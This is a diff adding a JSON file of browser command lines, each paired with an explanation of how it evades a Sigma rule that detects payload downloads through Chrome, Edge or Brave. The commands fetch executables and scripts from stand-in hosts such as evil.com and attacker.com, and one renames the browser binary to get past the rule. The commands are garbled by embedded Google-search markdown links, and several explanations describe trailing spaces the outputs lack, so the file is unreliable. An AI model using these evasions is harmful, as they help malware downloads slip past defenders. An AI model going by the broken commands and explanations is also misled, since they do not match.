@@ -1,0 +1,30 @@
+[
+  {
+    "output": "msedge.exe [example.com/payload.exe]()",
+    "explanation": "The rule explicitly requires the string 'http' to be present in the command line via the 'selection_http' condition. By providing only the domain or IP address without the protocol scheme, modern Chromium-based browsers will automatically resolve and download the file, bypassing the condition."
+  },
+  {
+    "output": "chrome.exe [http://malicious.com/payload.exe?token=123](https://www.google.com/search?q=http://malicious.com/payload.exe%3Ftoken%3D123)",
+    "explanation": "The 'selection_extensions' condition requires the command line to strictly end with the specified file extension (e.g., '.exe'). Appending a valid URL query string or fragment identifier to the URL means the command line ends with the parameter instead, successfully evading the rule."
+  },
+  {
+    "output": "msedge.exe \"[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)\"",
+    "explanation": "The 'CommandLine|endswith' logic is brittle against trailing characters. By encapsulating the URL in quotes or simply appending a trailing space at the end of the command line execution, the string terminates with a space or quote character rather than the file extension, bypassing the extension check."
+  },
+  {
+    "output": "cmd.exe /c copy \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" C:\\Temp\\sysupdate.exe && C:\\Temp\\sysupdate.exe [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)",
+    "explanation": "The detection relies on a hardcoded list of default browser binary names in the 'selection_img' condition. Copying the legitimate executable to a new directory with an unlisted name causes this condition to evaluate to false."
+  },
+  {
+    "output": "msedge.exe [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) --window-size=800,600",
+    "explanation": "The Sigma rule relies on the 'CommandLine|endswith' modifier to match the file extension. By appending a legitimate browser command-line flag (like --window-size or --headless) after the URL, the command line string no longer ends with '.exe', thus bypassing the detection logic."
+  },
+  {
+    "output": "chrome.exe \"[http://evil.com/script.ps1?token=12345](https://www.google.com/search?q=http://evil.com/script.ps1%3Ftoken%3D12345)\"",
+    "explanation": "Appending URL query parameters changes the final characters of the string. The command line now ends with the query parameter value or the closing quote, rather than the '.ps1' extension, evading the 'selection_extensions' condition."
+  },
+  {
+    "output": "brave.exe [http://attacker.com/archive.zip](https://www.google.com/search?q=http://attacker.com/archive.zip)",
+    "explanation": "Adding trailing whitespace to the command line execution can cause the 'endswith' condition to fail, as the string technically ends with spaces rather than the '.zip' extension, exposing a common fragility in string-matching detection rules."
+  }
+]
